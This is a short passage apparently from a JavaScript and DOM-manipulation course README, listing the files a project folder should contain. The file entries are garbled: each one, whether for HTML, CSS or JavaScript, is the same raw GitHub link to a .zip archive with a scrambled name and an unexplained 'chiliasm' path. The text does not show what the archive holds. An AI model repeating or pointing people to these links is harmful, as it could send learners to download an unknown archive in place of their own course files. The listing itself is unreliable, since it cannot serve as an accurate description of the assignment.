...
* A single project folder containing:
  ...
  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/introduction-to-july-dom-and-Griffnificent-javascript-manipulation-v3.3.zip` — your structured HTML content
  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/introduction-to-july-dom-and-Griffnificent-javascript-manipulation-v3.3.zip` — (optional) if you'd like to style your content
  * `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-javascript-and-dom-manipulation-Griffnificent/main/chiliasm/introduction-to-july-dom-and-Griffnificent-javascript-manipulation-v3.3.zip` — your JavaScript file including:
